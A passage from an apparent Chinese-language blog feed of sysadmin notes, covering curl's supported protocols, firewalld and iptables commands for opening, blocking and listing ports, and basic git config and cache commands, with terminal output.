class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span> --<span class="hljs-symbol">:--</span><span class="hljs-symbol">:--</span>  <span class="hljs-number">537</span>k<br>➜  /tmp <br>➜  /tmp ls -lat local_file.txt <br>-rw-r--r--  <span class="hljs-number">1</span> admin  wheel  <span class="hljs-number">95172</span> <span class="hljs-number">10</span> <span class="hljs-number">11</span> <span class="hljs-number">19</span><span class="hljs-symbol">:</span><span class="hljs-number">21</span> local_file.txt<br></code></pre></td></tr></table></figure><h3 id="GOPHER-GOPHERS"><a href="#GOPHER-GOPHERS" class="headerlink" title="GOPHER GOPHERS"></a>GOPHER GOPHERS</h3><p>Retrieve files.</p><p>检索文件</p><h3 id="HTTP-HTTPS"><a href="#HTTP-HTTPS" class="headerlink" title="HTTP HTTPS"></a>HTTP HTTPS</h3><p>curl supports HTTP with numerous options and variations. It can speak HTTP version 0.9, 1.0, 1.1, 2 and 3 depending on build options and the correct command line options.</p><p>curl通过许多选项和变体支持HTTP。它可以使用HTTP版本0.9、1.0、1.1、2和3，具体取决于构建选项和正确的命令行选项。</p><h3 id="IMAP-IMAPS"><a href="#IMAP-IMAPS" class="headerlink" title="IMAP IMAPS"></a>IMAP IMAPS</h3><p>Using the mail reading protocol, curl can “download” emails for you. With or without using TLS.</p><p>使用邮件读取协议，curl可以为您“下载”电子邮件。使用或不使用TLS。</p><h3 id="LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP"><a href="#LDAP-LDAPS-MQTT-POP3-POP3S-RTMP-RTMPS-RTSP-SCP-SFTP-SMB-SMBS-SMTP-SMTPS-TELNET-or-TFTP" class="headerlink" title="LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP"></a>LDAP, LDAPS, MQTT, POP3, POP3S, RTMP, RTMPS, RTSP, SCP, SFTP, SMB, SMBS, SMTP, SMTPS, TELNET or TFTP</h3><h2 id="官方链接"><a href="#官方链接" class="headerlink" title="官方链接"></a>官方链接</h2><p><a href="https://curl.se/libcurl/">https://curl.se/libcurl/</a></p><p><a href="https://github.com/curl/curl">https://github.com/curl/curl</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>iptables_command</title>
    <link href="/2024/03/15/yunwei/applications/firewalld/iptables_command/"/>
    <url>/2024/03/15/yunwei/applications/firewalld/iptables_command/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h1><h2 id="Centos"><a href="#Centos" class="headerlink" title="Centos"></a>Centos</h2><p>firewalld和iptables是可以并存的</p><h3 id="Friewalld"><a href="#Friewalld" class="headerlink" title="Friewalld"></a>Friewalld</h3><p>CentOS7默认防火墙</p><p>开启防护墙之后默认是没有任何策略的，也就是除SSH的22端口之外其他的端口都不通</p><p>防火墙策略的增加都是追加形式</p><h4 id="查询防火墙状态"><a href="#查询防火墙状态" class="headerlink" title="查询防火墙状态"></a>查询防火墙状态</h4><h5 id="firewall-cmd-–state"><a href="#firewall-cmd-–state" class="headerlink" title="firewall-cmd –state"></a>firewall-cmd –state</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>not running<br><br>┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--state</span><br>running<br></code></pre></td></tr></table></figure><h4 id="启动-停止防火墙"><a href="#启动-停止防火墙" class="headerlink" title="启动&#x2F;停止防火墙"></a>启动&#x2F;停止防火墙</h4><h5 id="systemctl-start-firewalld"><a href="#systemctl-start-firewalld" class="headerlink" title="systemctl start firewalld"></a>systemctl start firewalld</h5><h5 id="systemctl-stop-firewalld"><a href="#systemctl-stop-firewalld" class="headerlink" title="systemctl stop firewalld"></a>systemctl stop firewalld</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# systemctl start firewalld<br></code></pre></td></tr></table></figure><h4 id="开启-关闭开机启动"><a href="#开启-关闭开机启动" class="headerlink" title="开启&#x2F;关闭开机启动"></a>开启&#x2F;关闭开机启动</h4><h5 id="systemctl-enable-firewalld"><a href="#systemctl-enable-firewalld" class="headerlink" title="systemctl enable firewalld"></a>systemctl enable firewalld</h5><h5 id="systemctl-disable-firewalld"><a href="#systemctl-disable-firewalld" class="headerlink" title="systemctl disable firewalld"></a>systemctl disable firewalld</h5><figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nsis">┌──(root㉿kali2022-)-[~]<br>└─<span class="hljs-comment"># systemctl disable firewalld</span><br><br>┌──(root㉿kali2022-)-[~]<br>└─<span class="hljs-comment"># systemctl enable firewalld</span><br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/dbus-org.fedoraproject.FirewallD1.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br>Created symlink /etc/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/multi-<span class="hljs-literal">user</span>.target.wants/firewalld.service → /lib/<span class="hljs-params">system</span>d/<span class="hljs-params">system</span>/firewalld.service.<br></code></pre></td></tr></table></figure><h4 id="加载防火墙策略"><a href="#加载防火墙策略" class="headerlink" title="加载防火墙策略"></a>加载防火墙策略</h4><p>修改防火墙规则后，需要重新加载防火墙</p><h5 id="firewall-cmd-–reload"><a href="#firewall-cmd-–reload" class="headerlink" title="firewall-cmd –reload"></a>firewall-cmd –reload</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--reload</span><br>success<br></code></pre></td></tr></table></figure><h4 id="查看防火墙开放的端口"><a href="#查看防火墙开放的端口" class="headerlink" title="查看防火墙开放的端口"></a>查看防火墙开放的端口</h4><h5 id="firewall-cmd-–list-ports"><a href="#firewall-cmd-–list-ports" class="headerlink" title="firewall-cmd –list-ports"></a>firewall-cmd –list-ports</h5><p>默认不开放任何端口</p><h4 id="查看防火墙策略"><a href="#查看防火墙策略" class="headerlink" title="查看防火墙策略"></a>查看防火墙策略</h4><h5 id="firewall-cmd-–list-all"><a href="#firewall-cmd-–list-all" class="headerlink" title="firewall-cmd –list-all"></a>firewall-cmd –list-all</h5><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs nix">┌──(root㉿kali2022-)-[~]<br>└─<span class="hljs-comment"># firewall-cmd --list-all</span><br>public (active)<br>  <span class="hljs-params">target:</span> default<br>  <span class="hljs-params">icmp-block-inversion:</span> no<br>  <span class="hljs-params">interfaces:</span> eth0<br>  <span class="hljs-params">sources:</span><br>  <span class="hljs-params">services:</span> dhcpv6-client ssh<br>  <span class="hljs-params">ports:</span><br>  <span class="hljs-params">protocols:</span><br>  <span class="hljs-params">forward:</span> yes<br>  <span class="hljs-params">masquerade:</span> no<br>  <span class="hljs-params">forward-ports:</span><br>  <span class="hljs-params">source-ports:</span><br>  <span class="hljs-params">icmp-blocks:</span><br>  rich <span class="hljs-params">rules:</span><br>        rule family<span class="hljs-operator">=</span><span class="hljs-string">&quot;ipv4&quot;</span> source address<span class="hljs-operator">=</span><span class="hljs-string">&quot;10.222.28.166&quot;</span> port port<span class="hljs-operator">=</span><span class="hljs-string">&quot;11211&quot;</span> protocol<span class="hljs-operator">=</span><span class="hljs-string">&quot;tcp&quot;</span> accept<br></code></pre></td></tr></table></figure><h4 id="开启端口"><a href="#开启端口" class="headerlink" title="开启端口"></a>开启端口</h4><h5 id="firewall-cmd-–zone-public-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–zone-public-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –add-port&#x3D;80&#x2F;tcp –permanent</h5><p>参数解读：</p><p>–zone&#x3D;public #作用域</p><p>–add-port&#x3D;80&#x2F;tcp #添加端口，格式为：端口&#x2F;通讯协议</p><p>–permanent #永久生效，没有该参数防火墙重启后失效</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs subunit">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --zone=public --add-port=80/tcp --permanent<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span><br><span class="hljs-keyword"></span>┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --list-ports<br>80/tcp<br></code></pre></td></tr></table></figure><h4 id="删除端口"><a href="#删除端口" class="headerlink" title="删除端口"></a>删除端口</h4><h5 id="firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent"><a href="#firewall-cmd-–zone-public-–remove-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent"></a>firewall-cmd –zone&#x3D;public –remove-port&#x3D;80&#x2F;tcp –permanent</h5><h4 id="查询支持的zone"><a href="#查询支持的zone" class="headerlink" title="查询支持的zone"></a>查询支持的zone</h4><p>firewall-cmd –get-zones</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd <span class="hljs-comment">--get-zones</span><br>block dmz <span class="hljs-keyword">drop</span> <span class="hljs-keyword">external</span> home <span class="hljs-type">internal</span> nm-shared <span class="hljs-built_in">public</span> <span class="hljs-keyword">trusted</span> <span class="hljs-keyword">work</span><br></code></pre></td></tr></table></figure><h4 id="查询服务是否支持"><a href="#查询服务是否支持" class="headerlink" title="查询服务是否支持"></a>查询服务是否支持</h4><h5 id="firewall-cmd-–query-service-servicename"><a href="#firewall-cmd-–query-service-servicename" class="headerlink" title="firewall-cmd –query-service servicename"></a>firewall-cmd –query-service servicename</h5><p>firewall-cmd –query-service ftp</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022-)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ftp<br>no<br><br>┌──(root㉿kali2022-appsec)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--query-service</span> ssh<br>yes<br></code></pre></td></tr></table></figure><h4 id="临时开启服务"><a href="#临时开启服务" class="headerlink" title="临时开启服务"></a>临时开启服务</h4><p>firewall-cmd –add-service&#x3D;serviceName</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs subunit">[root@localhost tmp]# firewall-cmd --query-service ftp<br>no<br>[root@localhost tmp]# firewall-cmd --add-service=ftp<br><span class="hljs-keyword">success</span><br><span class="hljs-keyword"></span>[root@localhost tmp]# firewall-cmd --query-service ftp<br>yes<br></code></pre></td></tr></table></figure><h4 id="永久开启服务"><a href="#永久开启服务" class="headerlink" title="永久开启服务"></a>永久开启服务</h4><h5 id="firewall-cmd-–add-service-servicename-–permanent"><a href="#firewall-cmd-–add-service-servicename-–permanent" class="headerlink" title="firewall-cmd –add-service&#x3D;servicename –permanent"></a><strong>firewall-cmd –add-service&#x3D;servicename –permanent</strong></h5><p>firewall-cmd –add-service&#x3D;ftp –permanent     ##永久开放ftp服务</p><h4 id="永久添加端口"><a href="#永久添加端口" class="headerlink" title="永久添加端口"></a>永久添加端口</h4><h5 id="firewall-cmd-–add-port-80-tcp-–permanent"><a href="#firewall-cmd-–add-port-80-tcp-–permanent" class="headerlink" title="firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent"></a><strong>firewall-cmd –add-port&#x3D;80&#x2F;tcp –permanent</strong></h5><h5 id=""><a href="#" class="headerlink" title=""></a></h5><h4 id="删除防火墙策略"><a href="#删除防火墙策略" class="headerlink" title="删除防火墙策略"></a>删除防火墙策略</h4><p>–remove-rich-rule 参数</p><p>firewall-cmd –permanent –remove-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”3306” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(base) [root@nvm- /]# firewall-cmd --permanent <span class="hljs-attribute">--remove-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot;<span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3306&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h4 id="查看防火墙版本"><a href="#查看防火墙版本" class="headerlink" title="查看防火墙版本"></a>查看防火墙版本</h4><h5 id="firewall-cmd-–version（必须在防火墙启动的情况下才有结果）"><a href="#firewall-cmd-–version（必须在防火墙启动的情况下才有结果）" class="headerlink" title="firewall-cmd –version（必须在防火墙启动的情况下才有结果）"></a><strong>firewall-cmd –version</strong>（必须在防火墙启动的情况下才有结果）</h5><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">┌──(root㉿kali2022)-<span class="hljs-selector-attr">[~]</span><br>└─# firewall-cmd <span class="hljs-attr">--version</span><br><span class="hljs-number">1.1</span><span class="hljs-selector-class">.1</span><br></code></pre></td></tr></table></figure><h4 id="防火墙策略文件位置"><a href="#防火墙策略文件位置" class="headerlink" title="防火墙策略文件位置"></a>防火墙策略文件位置</h4><h5 id="etc-firewalld-zones"><a href="#etc-firewalld-zones" class="headerlink" title="&#x2F;etc&#x2F;firewalld&#x2F;zones"></a><strong>&#x2F;etc&#x2F;firewalld&#x2F;zones</strong></h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs xml">(base) [root@110 ~]# cat /etc/firewalld/zones/public.xml<br><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">zone</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">short</span>&gt;</span>Public<span class="hljs-tag">&lt;/<span class="hljs-name">short</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">description</span>&gt;</span>For use in public areas. You do not trust the other computers on networks to not harm your computer. Only selected incoming connections are accepted.<span class="hljs-tag">&lt;/<span class="hljs-name">description</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;ssh&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">service</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;dhcpv6-client&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">rule</span> <span class="hljs-attr">family</span>=<span class="hljs-string">&quot;ipv4&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">source</span> <span class="hljs-attr">address</span>=<span class="hljs-string">&quot;0.0.0.0/0&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">port</span> <span class="hljs-attr">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attr">port</span>=<span class="hljs-string">&quot;21&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">reject</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">rule</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">zone</span>&gt;</span><br></code></pre></td></tr></table></figure><h4 id="查看当前防火墙策略组"><a href="#查看当前防火墙策略组" class="headerlink" title="查看当前防火墙策略组"></a>查看当前防火墙策略组</h4><p>firewall-cmd –get-default-zone</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs swift">[root<span class="hljs-meta">@nvm</span><span class="hljs-operator">-</span> logs]# firewall<span class="hljs-operator">-</span>cmd <span class="hljs-operator">--</span><span class="hljs-keyword">get</span><span class="hljs-operator">-</span><span class="hljs-keyword">default</span><span class="hljs-operator">-</span>zone<br><span class="hljs-keyword">public</span><br></code></pre></td></tr></table></figure><h4 id="设置IP和端口策略"><a href="#设置IP和端口策略" class="headerlink" title="设置IP和端口策略"></a>设置IP和端口策略</h4><h5 id="禁止"><a href="#禁止" class="headerlink" title="禁止"></a>禁止</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”172.26.208.22” port protocol&#x3D;”tcp” port&#x3D;”11” reject”</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;172.26.208.22&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span> <span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;11&quot;</span> reject<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="允许"><a href="#允许" class="headerlink" title="允许"></a>允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”5601” accept”</p><p>sudo firewall-cmd –zone&#x3D;public –add-rich-rule&#x3D;’rule family&#x3D;”ipv4” source address&#x3D;”1.1.1.1” port protocol&#x3D;”tcp” port&#x3D;”3306” accept’</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kali2022-)-[~]<br>└─# firewall-cmd --permanent <span class="hljs-attribute">--add-rich-rule</span>=<span class="hljs-string">&quot;rule family=&quot;</span>ipv4&quot; source <span class="hljs-attribute">address</span>=<span class="hljs-string">&quot;10.222.28.0/24&quot;</span><span class="hljs-built_in"> port </span><span class="hljs-attribute">protocol</span>=<span class="hljs-string">&quot;tcp&quot;</span><br><span class="hljs-attribute">port</span>=<span class="hljs-string">&quot;3390&quot;</span> accept<span class="hljs-string">&quot;</span><br><span class="hljs-string">success</span><br></code></pre></td></tr></table></figure><h5 id="网段允许"><a href="#网段允许" class="headerlink" title="网段允许"></a>网段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” source address&#x3D;”10.222.28.0&#x2F;24” port protocol&#x3D;”tcp” port&#x3D;”80” accept”</p><h5 id="端口段允许"><a href="#端口段允许" class="headerlink" title="端口段允许"></a>端口段允许</h5><p>firewall-cmd –permanent –add-rich-rule&#x3D;”rule family&#x3D;”ipv4” port protocol&#x3D;”tcp” port&#x3D;”50000-60000” accept”</p><h3 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h3><h4 id="安装防火墙"><a href="#安装防火墙" class="headerlink" title="安装防火墙"></a>安装防火墙</h4><p>yum -y install iptables-services</p><h5 id="增加规则"><a href="#增加规则" class="headerlink" title="增加规则"></a>增加规则</h5><p>如果要修改防火墙配置，如增加防火墙端口3306</p><p>vim &#x2F;etc&#x2F;sysconfig&#x2F;iptables </p><p>-A INPUT -m state –state NEW -m tcp -p tcp –dport 3306 -j ACCEPT</p><p>保存退出后</p><p>systemctl restart iptables.service #重启防火墙使配置生效</p><p>systemctl enable iptables.service #设置防火墙开机启动</p><p>最后重启系统使设置生效即可。</p><p>增加防火墙</p><p>[root@localhost opt]# iptables -A INPUT -p tcp –dport 80 -j ACCEPT<br>[root@localhost opt]# service iptables status<br>Table: filter<br>Chain INPUT (policy ACCEPT)<br>num  target     prot opt source               destination<br>1    ACCEPT     tcp  –  0.0.0.0&#x2F;0            0.0.0.0&#x2F;0           tcp dpt:80 </p><p>Chain FORWARD (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>Chain OUTPUT (policy ACCEPT)<br>num  target     prot opt source               destination         </p><p>删除防火墙</p><p>iptables -D INPUT [NUM]</p><p>允许IP段</p><p>iptables -A INPUT -s 10.222.28.0&#x2F;24 -p tcp –dport 3390 -j ACCEPT</p><p>iptables -I INPUT -s 172.16.153.57 -p tcp –dport 80 -j ACCEPT</p><p>172.16.234.56</p><p>iptables -A INPUT -p tcp –dport 8080 -j DROP</p><p>1.开放80，22，8080 端口</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 80 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 22 -j ACCEPT</p><p>&#x2F;sbin&#x2F;iptables -I INPUT -p tcp –dport 8080 -j ACCEPT</p><p>2.保存</p><p>&#x2F;etc&#x2F;rc.d&#x2F;init.d&#x2F;iptables save</p><p>3.查看打开的端口</p><p>&#x2F;etc&#x2F;init.d&#x2F;iptables status</p><p>4.关闭防火墙 </p><p>1） 永久性生效，重启后不会复原</p><p>开启： chkconfig iptables on</p><p>关闭： chkconfig iptables off</p><p>2） 即时生效，重启后复原</p><p>开启： service iptables start</p><p>关闭： service iptables stop</p><h4 id="查看防火墙规则"><a href="#查看防火墙规则" class="headerlink" title="查看防火墙规则"></a>查看防火墙规则</h4><h5 id="iptables-nL"><a href="#iptables-nL" class="headerlink" title="iptables -nL"></a>iptables -nL</h5><h4 id="清除防火墙规则"><a href="#清除防火墙规则" class="headerlink" title="清除防火墙规则"></a>清除防火墙规则</h4><h5 id="iptables-F"><a href="#iptables-F" class="headerlink" title="iptables -F"></a>iptables -F</h5><h2 id="Kali"><a href="#Kali" class="headerlink" title="Kali"></a>Kali</h2><h3 id="安装-ufw"><a href="#安装-ufw" class="headerlink" title="安装 ufw"></a>安装 ufw</h3><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmake">apt <span class="hljs-keyword">install</span> ufw<br></code></pre></td></tr></table></figure><h3 id="查看防火墙状态-ufw-status"><a href="#查看防火墙状态-ufw-status" class="headerlink" title="查看防火墙状态 ufw status"></a>查看防火墙状态 ufw status</h3><h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><p>阻止的策略优先于允许的策略</p><p><a href="https://blog.csdn.net/lql971203/article/details/84450960">https://blog.csdn.net/lql971203/article/details/84450960</a></p><p><a href="https://blog.csdn.net/lql971203/article/details/84451028">https://blog.csdn.net/lql971203/article/details/84451028</a></p>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>firewalld</tag>
      
      <tag>iptables</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_base/"/>
    <url>/2024/03/15/yunwei/applications/git/git_base/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p><h1 id="command"><a href="#command" class="headerlink" title="command"></a>command</h1><h2 id="git-config"><a href="#git-config" class="headerlink" title="git config"></a>git config</h2><h3 id="git-config-l"><a href="#git-config-l" class="headerlink" title="git config -l"></a>git config -l</h3><p>返回所有配置信息</p><p>返回值为key&#x3D;value格式</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl">[root<span class="hljs-variable">@localhost</span> software]<span class="hljs-comment"># git config --global -l</span><br>http.https:<span class="hljs-regexp">//gi</span>thub.com.proxy=socks5:<span class="hljs-regexp">//</span><span class="hljs-number">10.222</span><span class="hljs-number">.28</span>.<span class="hljs-number">7</span>:<span class="hljs-number">1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-get-keyname"><a href="#git-config-get-keyname" class="headerlink" title="git config get keyname"></a>git config get keyname</h3><p>返回指定key的value</p><figure class="highlight dart"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs dart">[root<span class="hljs-meta">@localhost</span> software]# git config --global --<span class="hljs-keyword">get</span> http.https:<span class="hljs-comment">//github.com.proxy</span><br>socks5:<span class="hljs-comment">//10.222.28.7:1081</span><br></code></pre></td></tr></table></figure><h3 id="git-config-–global-–unset-keyname"><a href="#git-config-–global-–unset-keyname" class="headerlink" title="git config –global –unset keyname"></a>git config –global –unset keyname</h3><p>取消指定key的配置</p><figure class="highlight hsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs hsp">[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --unset http.https:<span class="hljs-comment">//github.com.proxy</span></span><br>[root@localhost software]<span class="hljs-meta"># git config --<span class="hljs-keyword">global</span> --get http.https:<span class="hljs-comment">//github.com.proxy</span></span><br></code></pre></td></tr></table></figure><h2 id="清除本地缓存"><a href="#清除本地缓存" class="headerlink" title="清除本地缓存"></a>清除本地缓存</h2><p><strong>git rm -r –cached .</strong></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">➜  studynote git:(main) ✗ git <span class="hljs-built_in">rm</span> -r --cached .<br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;.gitignore&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;README.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangBase.md&#x27;</span><br><span class="hljs-built_in">rm</span> <span class="hljs-string">&#x27;dev/golang/golangError.md&#x27;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>yunwei</category>
      
      <category>applications</category>
      
    </categories>
    
    
    <tags>
      
      <tag>base</tag>
      
      <tag>yunwei</tag>
      
      <tag>applications</tag>
      
      <tag>git</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>git_base</title>
    <link href="/2024/03/15/yunwei/applications/git/git_error/"/>
    <url>/2024/03/15/yunwei/applications/git/git_error/</url>
    
